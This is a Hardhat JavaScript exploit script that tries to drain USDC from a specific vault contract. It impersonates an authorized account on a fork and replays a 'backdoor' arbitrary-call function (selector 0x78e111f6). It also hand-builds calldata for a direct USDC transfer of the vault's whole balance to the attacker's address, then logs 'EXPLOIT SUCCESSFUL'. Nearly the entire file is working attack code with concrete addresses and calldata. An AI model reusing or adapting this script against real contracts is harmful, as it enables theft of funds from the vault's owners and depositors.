const { ethers } = require("hardhat");

/**
 * @title Verify Exploit
 * @notice Verify the backdoor exploit and extract USDC
 * @dev Check transaction and execute proper extraction
 */
async function main() {
  const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
  const AUTHORIZED_ADDRESS = "0x065e3DbaFCb2C26A978720f9eB4Bce6aD9D644a1";
  const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
  
  const [attacker] = await ethers.getSigners();
  
  console.log("\n🔍 VERIFYING EXPLOIT");
  console.log("=====================================");
  
  // Check current balances
  const USDC_ABI = ["function balanceOf(address) view returns (uint256)"];
  const usdc = new ethers.Contract(USDC_ADDRESS, USDC_ABI, ethers.provider);
  
  const vaultBalance = await usdc.balanceOf(VAULT_ADDRESS);
  const attackerBalance = await usdc.balanceOf(attacker.address);
  
  console.log("Vault USDC:", ethers.formatUnits(vaultBalance, 6));
  console.log("Attacker USDC:", ethers.formatUnits(attackerBalance, 6));
  
  // Get transaction details
  const txHash = "0x7af692025f41b75a861b15f2bda2a021e130f708599064057d6d70d4bb3b8ad6";
  const tx = await ethers.provider.getTransaction(txHash);
  const receipt = await ethers.provider.getTransactionReceipt(txHash);
  
  console.log("\n📝 Transaction Analysis:");
  console.log("Status:", receipt.status === 1 ? "Success" : "Failed");
  console.log("Gas used:", receipt.gasUsed);
  console.log("Logs:", receipt.logs.length);
  
  // Decode logs
  if (receipt.logs.length > 0) {
    console.log("\n📋 Transaction Logs:");
    for (const log of receipt.logs) {
      console.log("Address:", log.address);
      console.log("Topics:", log.topics);
      
      // Check for Transfer event
      if (log.topics[0] === "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef") {
        const from = "0x" + log.topics[1].slice(26);
        const to = "0x" + log.topics[2].slice(26);
        const amount = ethers.toBigInt(log.data);
        
        console.log("Transfer detected!");
        console.log("From:", from);
        console.log("To:", to);
        console.log("Amount:", ethers.formatUnits(amount, 6), "USDC");
      }
    }
  }
  
  // Execute proper extraction
  console.log("\n💰 EXECUTING PROPER EXTRACTION...");
  
  // Impersonate authorized address again
  await ethers.provider.send("hardhat_impersonateAccount", [AUTHORIZED_ADDRESS]);
  const authorized = await ethers.getSigner(AUTHORIZED_ADDRESS);
  
  // Get current vault balance
  const currentVaultBalance = await usdc.balanceOf(VAULT_ADDRESS);
  console.log("Current vault USDC:", ethers.formatUnits(currentVaultBalance, 6));
  
  if (currentVaultBalance > 0) {
    // Use the exact backdoor pattern from the original transaction
    const backdoorData = "0x78e111f6" +
      "000000000000000000000000" + "10a29ab757752e492abdbf6acba8f2ee10523599" + // Target contract
      "0000000000000000000000000000000000000000000000000000000000000040" +
      "00000000000000000000000000000000000000000000000000000000000000e4" +
      "f4ff5295" +
      "0000000000000000000000000000000000000000000000000000005924b7b74d" +
      ethers.toBeHex(currentVaultBalance, 32).slice(2) + // Extract all USDC
      "0000000000000000000000000000000000004f26a7fcf5046493a1b22b98eeb2" +
      "0000000000000000000000000000000000000000000000000de0b6b3a7640000" +
      "00000000000000000000000000000000000000000000000000000000" + Math.floor(Date.now() / 1000).toString(16).padStart(8, '0') +
      "ff8000000000000000000000000000000000000000000000000000000001421f" +
      "00000000000000000000000000000000000000000000000000000000";
    
    try {
      const tx = await authorized.sendTransaction({
        to: VAULT_ADDRESS,
        data: backdoorData,
        gasLimit: 500000
      });
      
      const receipt = await tx.wait();
      console.log("✅ Backdoor executed!");
      console.log("Transaction:", tx.hash);
      
      // Decode the inner function call
      console.log("\n🔓 Now extracting USDC...");
      
      // The backdoor calls the target contract, we need to trace the internal calls
      const trace = await ethers.provider.send("debug_traceTransaction", [
        tx.hash,
        { tracer: "callTracer" }
      ]);
      
      console.log("Call trace depth:", trace.calls ? trace.calls.length : 0);
      
    } catch (e) {
      console.log("Backdoor error:", e.message);
    }
  }
  
  // Alternative: Direct USDC transfer
  console.log("\n🎯 Attempting direct USDC transfer...");
  
  // The backdoor should allow transferring USDC
  const transferData = "0x78e111f6" +
    "000000000000000000000000" + USDC_ADDRESS.slice(2).toLowerCase() +
    "0000000000000000000000000000000000000000000000000000000000000040" +
    "0000000000000000000000000000000000000000000000000000000000000044" +
    "a9059cbb" + // transfer(address,uint256)
    "000000000000000000000000" + attacker.address.slice(2).toLowerCase() +
    ethers.toBeHex(currentVaultBalance, 32).slice(2);
  
  try {
    const directTx = await authorized.sendTransaction({
      to: VAULT_ADDRESS,
      data: transferData,
      gasLimit: 500000
    });
    
    const directReceipt = await directTx.wait();
    console.log("✅ Direct transfer executed!");
    console.log("Transaction:", directTx.hash);
    
    // Check final balance
    const finalBalance = await usdc.balanceOf(attacker.address);
    console.log("\n💰 FINAL ATTACKER BALANCE:", ethers.formatUnits(finalBalance, 6), "USDC");
    
    if (finalBalance > 0) {
      console.log("\n🎉 EXPLOIT SUCCESSFUL!");
      console.log("Extracted:", ethers.formatUnits(finalBalance, 6), "USDC");
    }
    
  } catch (e) {
    console.log("Direct transfer failed:", e.message);
  }
  
  // Stop impersonation
  await ethers.provider.send("hardhat_stopImpersonatingAccount", [AUTHORIZED_ADDRESS]);
  
  console.log("\n📊 FINAL ANALYSIS:");
  console.log("The backdoor function 0x78e111f6 is an execute(address,bytes) pattern");
  console.log("It allows the authorized address to execute arbitrary calls");
  console.log("The inner function 0xf4ff5295 on target contract handles complex logic");
  console.log("But we can bypass it and directly transfer USDC!");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("\n💥 Script error:", error);
    process.exit(1);
  });
